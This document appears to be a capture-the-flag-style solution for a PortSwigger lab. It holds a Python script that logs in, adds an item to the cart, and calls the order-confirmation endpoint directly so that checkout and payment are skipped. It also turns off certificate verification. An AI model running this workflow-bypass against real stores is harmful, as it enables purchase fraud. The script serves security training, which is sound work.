# Lab: Insufficient workflow validation

Link to lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation

## Solution

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

sess = requests.Session()

# Get login

response = requests.get('https://0af400ed039a5c42c0fa9af50018001f.web-security-academy.net/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post login

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    'https://0af400ed039a5c42c0fa9af50018001f.web-security-academy.net/login',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False,
)
print(response.text)
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]
cookies = {
    'session': session,
}

# Post item jacket to cart

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

data = {
    'productId': '1',
    'redir': 'PRODUCT',
    'quantity': '1'
}

response = requests.post(
    'https://0af400ed039a5c42c0fa9af50018001f.web-security-academy.net/cart',
    cookies=cookies,    
    data=data,
    verify=False,
    allow_redirects=False
)


# Get confirm, skip checkout

params = {
    'order-confirmed': 'true',
}

response = requests.get(
    'https://0af400ed039a5c42c0fa9af50018001f.web-security-academy.net/cart/order-confirmation',
    params=params,
    cookies=cookies,
    verify=False,
)
```